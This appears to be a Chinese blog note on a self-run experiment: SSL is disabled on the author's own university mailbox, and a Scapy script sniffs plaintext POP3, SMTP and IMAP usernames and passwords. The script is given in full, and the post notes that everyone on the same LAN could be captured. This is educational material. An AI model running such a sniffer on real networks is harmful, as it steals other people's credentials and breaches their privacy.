ailx10说：这篇是在2022年6月之前写的，后来又改过。这次拿自己的邮箱做实验，最开始默认开着 SSL，抓包当然看不见想找的内容。为了理解书里的明文嗅探例子，我在测试设置里关掉加密，再用 Scapy 去看相关端口和 user、pass 字段，现象才一下对上。文章连这个小转折也留着，因为比起“脚本抓到了密码”，前后两个状态的差异更直观。平时一个勾选框好像没什么存在感，放在通信里对照，才知道它保护的正是那些原本可能直接出现在路上的文字。

---

仅按子串匹配 `user` 或 `pass`，不能保证提取到完整的邮件协议凭据。



1、2015年上学的时候SSL还没有打勾，现在安全要求高了，默认打勾了，需要修改一下前端页面，取消打勾，否则抓取不到明文

![](/notes-assets/26212556f8d76e1064da.jpg)

2、在mbp上运行脚本，并访问中科大邮箱，就能抓取到邮箱的用户名和密码的明文，如果打勾SSL，就看不到明文了

![](/notes-assets/333b06beb65f37e24180.jpg)

3、在kali虚拟机上访问中科大邮箱，同样可以抓取到用户名和密码，也就是说只要是局域网里面的所有人访问中科大邮箱，都能抓取到他们的用户名和密码

![](/notes-assets/0684362c90abd850c1de.jpg)

参考代码：

```
# -*- coding: utf-8 -*-
# @Time    : 2022/6/6 7:35 PM
# @Author  : ailx10
# @File    : mail_sniffer.py

from scapy.all import *
from scapy.layers.inet import IP,TCP
from scapy.config import conf
conf.use_pcap = True

def packet_callback(packet):
    if packet.haslayer(TCP):
        if packet[TCP].payload:
            mypacket = str(packet[TCP].payload)
            if "user" in mypacket.lower() or "pass" in mypacket.lower():
                print(f"[*] Destination :{packet[IP].dst}")
                print(f"[*] {str(packet[TCP].payload)}")

def main():
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)

if __name__ == "__main__":
    main()
```

![](/notes-assets/4e0c823502d872a48b55.jpg)

能嗅探到测试凭据，不表示默认就能看见整个局域网。流量位置、协议和加密方式共同决定视野，理解这些前提，比简单搜索user或pass更重要。
